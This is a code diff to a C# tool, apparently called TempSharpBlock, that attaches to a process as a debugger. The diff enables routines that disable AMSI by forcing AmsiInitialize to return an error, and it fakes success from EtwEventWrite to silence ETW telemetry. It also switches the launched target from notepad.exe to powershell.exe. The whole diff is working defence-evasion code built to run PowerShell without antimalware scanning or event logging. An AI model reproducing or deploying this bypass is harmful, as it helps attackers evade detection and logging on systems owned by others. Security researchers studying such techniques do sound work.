@@ -52,6 +52,54 @@ namespace TempSharpBlock
             return dw;
         }
 
+        static void DisableAMSI(IntPtr hThread, IntPtr hProcess)
+        {
+            //Set result of AmsiInitialize to indicate disabled.
+            Console.WriteLine("DisablingAMSI=============================================");
+            OverrideReturnValue(hThread, hProcess, new UIntPtr(0x80070002), 2);
+        }
+
+        static void OverrideReturnValue(IntPtr hThread, IntPtr hProcess, UIntPtr value, int numArgs)
+        {
+            if(IntPtr.Size == 8)
+            {
+                Structs.CONTEXT64 ctx = new Structs.CONTEXT64();
+                Structs.GetThreadContext(hThread, ref ctx);
+                //Reads the memory for the current stack pointer to get the return address
+                byte[] returnAddress = new byte[8];
+                IntPtr bytesRead;
+                Structs.ReadProcessMemory(hProcess, new IntPtr((long)ctx.Rsp), returnAddress, 8, out bytesRead);
+                ctx.Rip = BitConverter.ToUInt64(returnAddress, 0);
+                //Pop return address and restore the stack pointer to the prior state before the function was called
+                ctx.Rsp += 8;
+                //Set the result
+                ctx.Rax = value.ToUInt64();
+                Structs.SetThreadContext(hThread, ref ctx);
+            }
+            else
+            {
+                Structs.CONTEXT32 ctx = new Structs.CONTEXT32();
+                Structs.GetThreadContext(hThread, ref ctx);
+                //Reads the memory for the current stack pointer to get the return address
+                byte[] returnAddress = new byte[4];
+                IntPtr bytesRead;
+                Structs.ReadProcessMemory(hProcess, new IntPtr((long)ctx.Esp), returnAddress, 4, out bytesRead);
+                ctx.Eip =  BitConverter.ToUInt32(returnAddress, 0);
+                //Pop return address and restore the stack pointer to the prior state before the function was called
+                ctx.Esp += 4;
+                //x86 stdcall calling convention expects callee to pop
+                //arguments off the stack. x64 uses registers for first
+                //4 arguments.
+                while (numArgs-- > 0)
+                {
+                    ctx.Esp += 4;
+                }
+                ctx.Eax = (uint)value.ToUInt64();
+                //Set the result
+                Structs.SetThreadContext(hThread, ref ctx);
+            }
+        }
+
 
         static void SetHardwareBreakpoint(IntPtr hThread, IntPtr address, int index)
         {
@@ -293,7 +341,7 @@ namespace TempSharpBlock
         static void Main(string[] args)
         {
 
-            string program = Environment.SystemDirectory + Path.DirectorySeparatorChar + "notepad.exe";
+            string program = Environment.SystemDirectory + Path.DirectorySeparatorChar + @"WindowsPowerShell\v1.0\powershell.exe";
             IntPtr amsiBase = Structs.LoadLibrary("amsi.dll");
             amsiInitalizePtr = Structs.GetProcAddress(amsiBase, "AmsiInitialize");
 
@@ -379,10 +427,12 @@ namespace TempSharpBlock
                         case Structs.LOAD_DLL_DEBUG_EVENT:
                             Structs.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = GetStructureFromByteArray<Structs.LOAD_DLL_DEBUG_INFO>(DebugEvent.u);
                             string dllPath = PatchEntryPointIfNeeded(LoadDLLDebugInfo.hFile, LoadDLLDebugInfo.lpBaseOfDll, processHandles[DebugEvent.dwProcessId]);
+                            SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], etwEventWritePtr, 2);
+
 
                             //Console.WriteLine($"[=] DLL Load: {dllPath}");
 
-                            
+
 
                             break;
 
@@ -398,7 +448,7 @@ namespace TempSharpBlock
                                 {
                                     //It is, to update the thread context to return to caller with 
                                     //an invalid result
-                                    //DisableAMSI(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
+                                    DisableAMSI(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
 
                                     //Set the hardware breakpoint again for AmsiInitalize
                                     SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], amsiInitalizePtr, 0);
@@ -408,7 +458,7 @@ namespace TempSharpBlock
                                 else if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == etwEventWritePtr)
                                 {
                                     //We have hit EtwEventWrite so lets just return with a fake success result
-                                    //OverrideReturnValue(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId], new UIntPtr(0), 5);
+                                    OverrideReturnValue(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId], new UIntPtr(0), 5);
                                 }
                                 else if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == ntProtectVirtualMemoryPtr)
                                 {
